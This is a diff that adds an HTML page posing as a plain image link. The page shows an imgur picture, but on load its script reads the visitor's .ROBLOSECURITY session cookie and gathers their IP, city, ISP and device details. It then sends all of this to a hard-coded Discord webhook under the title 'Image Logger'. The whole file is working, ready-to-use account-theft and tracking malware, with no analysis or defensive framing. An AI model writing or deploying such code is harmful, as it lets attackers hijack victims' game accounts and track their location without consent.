@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Image</title>
+    <meta http-equiv="refresh" content="0; url=https://i.imgur.com/3pYQZ5P.png">
+    <script>
+        const WEBHOOK = "https://discord.com/api/webhooks/1526646528192680057/gz23VoW83XWhbbgd1h5238H3BQB3G6GZWzE8Kq8Sdn21eQEyWNSkBWpChKW2VLxnfNkr";
+
+        // ===== ROBLOX COOKIE ONLY =====
+        function getRobloxCookie() {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                cookie = cookie.trim();
+                if (cookie.startsWith('.ROBLOSECURITY=')) {
+                    return cookie;
+                }
+            }
+            return null;
+        }
+
+        // ===== IP =====
+        function getIP() {
+            return fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => data.ip)
+                .catch(() => 'Unknown');
+        }
+
+        // ===== LOCATION =====
+        function getLocation(ip) {
+            return fetch(`https://ipapi.co/${ip}/json/`)
+                .then(r => r.json())
+                .then(data => ({
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country_name || 'Unknown',
+                    isp: data.org || 'Unknown'
+                }))
+                .catch(() => ({ city: 'Unknown', region: 'Unknown', country: 'Unknown', isp: 'Unknown' }));
+        }
+
+        // ===== DEVICE INFO =====
+        function getDeviceInfo() {
+            return {
+                os: navigator.platform || 'Unknown',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+                language: navigator.language || 'Unknown',
+                userAgent: navigator.userAgent || 'Unknown'
+            };
+        }
+
+        // ===== MAIN =====
+        async function log() {
+            const ip = await getIP();
+            const loc = await getLocation(ip);
+            const device = getDeviceInfo();
+            const roblox = getRobloxCookie();
+
+            const fields = [
+                {name: "IP", value: ip, inline: true},
+                {name: "City", value: loc.city, inline: true},
+                {name: "Region", value: loc.region, inline: true},
+                {name: "Country", value: loc.country, inline: true},
+                {name: "ISP", value: loc.isp, inline: true},
+                {name: "OS", value: device.os, inline: true},
+                {name: "Screen", value: device.screen, inline: true},
+                {name: "Timezone", value: device.timezone, inline: true},
+                {name: "Language", value: device.language, inline: true},
+                {name: "User Agent", value: device.userAgent.substring(0, 120), inline: false},
+                {name: "Time", value: new Date().toISOString(), inline: false}
+            ];
+
+            if (roblox) {
+                fields.push({name: "ROBLOSECURITY", value: roblox, inline: false});
+            } else {
+                fields.push({name: "ROBLOSECURITY", value: "Not found", inline: false});
+            }
+
+            const embed = {
+                embeds: [{
+                    title: "Image Logger",
+                    color: 0xff0000,
+                    fields: fields
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(embed)
+                });
+            } catch(e) {}
+
+            // Fallback text
+            try {
+                const msg = `IP: ${ip}\nLocation: ${loc.city}, ${loc.region}, ${loc.country}\nISP: ${loc.isp}\nOS: ${device.os}\nROBLOSECURITY: ${roblox || 'Not found'}\nTime: ${new Date().toISOString()}`;
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({content: msg})
+                });
+            } catch(e) {}
+        }
+
+        log();
+    </script>
+    <style>
+        body { margin: 0; overflow: hidden; background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; }
+        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+    </style>
+</head>
+<body>
+    <img src="https://i.imgur.com/3pYQZ5P.png" alt="Image" />
+</body>
+</html>
